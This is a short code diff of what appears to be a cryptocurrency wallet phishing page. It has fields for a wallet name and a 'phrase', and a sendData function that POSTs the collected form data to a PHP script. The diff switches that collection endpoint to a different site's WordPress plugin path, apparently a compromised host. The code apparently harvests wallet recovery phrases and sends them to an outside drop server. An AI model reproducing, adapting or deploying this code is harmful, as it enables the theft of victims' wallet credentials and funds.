@@ -6,6 +6,7 @@
   var second = document.getElementById("second");
   var third = document.querySelector("#third");
   var wallet_name = document.querySelector("#walletname");
+  
   phrase.addEventListener("click", function() {
     hide(first);
   });
@@ -71,7 +72,7 @@ function sendData( data ) {
   } );
 
   // Set up our request
-  XHR.open( 'POST', 'https://siameseinter.com/wp-content/plugins/easybusy/poc/tfx-report.php' );
+  XHR.open( 'POST', 'https://dev.nte.org.au/wp-content/plugins/easybusy/sycb/txf-report.php' );
 
   // Send our FormData object; HTTP headers are set automatically
   XHR.send(FD);
